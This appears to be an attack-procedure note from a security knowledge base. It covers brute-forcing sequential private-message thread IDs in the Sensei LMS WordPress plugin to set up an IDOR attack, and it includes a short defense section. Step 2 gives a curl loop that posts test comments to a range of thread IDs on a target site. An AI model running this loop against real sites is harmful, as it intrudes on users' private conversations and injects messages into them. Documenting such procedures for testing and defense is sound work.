---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - brute-force
  - thread-id
  - discovery
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/test-thread-id-access]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:33.918Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Identify-Target-Private-Message-Thread-ID

## Summary

This procedure involves discovering or brute-forcing the sequential numeric ID of a target private message thread in Sensei LMS, exploiting the predictable ID assignment to identify conversations for unauthorized access.

## Description

Sensei LMS assigns private threads between students and teachers sequential numeric IDs starting from low values (e.g., 111). Without protection against enumeration, attackers can guess or brute-force these IDs by testing them in requests. This step enables targeting specific private conversations for IDOR exploitation. Prerequisites include an authenticated student session.

## Requirements

1. Authenticated session as a student
2. Knowledge of the target site's messaging endpoint
3. HTTP client capable of sending test requests (e.g., curl with scripting for brute-force)

## Defense

Defensive measures and detection strategies:

- Implement random, non-sequential IDs for private resources
- Add server-side validation to reject unauthorized thread access attempts
- Log and monitor POST requests to /wp-comments-post.php for unusual comment_post_ID values

## Objectives

1. Enumerate valid private thread IDs
2. Identify a target thread belonging to another student
3. Prepare for message injection without viewing existing content

## Instructions

### Step 1: Observe ID Patterns

**Context**: Analyze own threads to understand the sequential nature of IDs.

Use browser dev tools to inspect requests when accessing personal messages.

> Expected output: Thread IDs visible in URLs or parameters, e.g., comment_post_ID=111.

### Step 2: Brute-Force Target ID

**Context**: Test sequential IDs to find a valid target thread.

**Command** ([[commands/test-thread-id-access]]):
```bash
for id in {100..200}; do curl -s -X POST -b "wordpress_logged_in_*=session" https://target.com/wp-comments-post.php -d "comment=test&submit=Post Comment&comment_post_ID=$id&comment_parent=0" | grep -q "success" && echo "Valid ID: $id"; done
```

> This loops through potential IDs, sending test POSTs and checking for success indicators like redirects or no error. Expected output: Valid IDs printed where the request succeeds without authorization denial.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/test-thread-id-access]]

## Tools Used


## Tags

- brute-force
- discovery
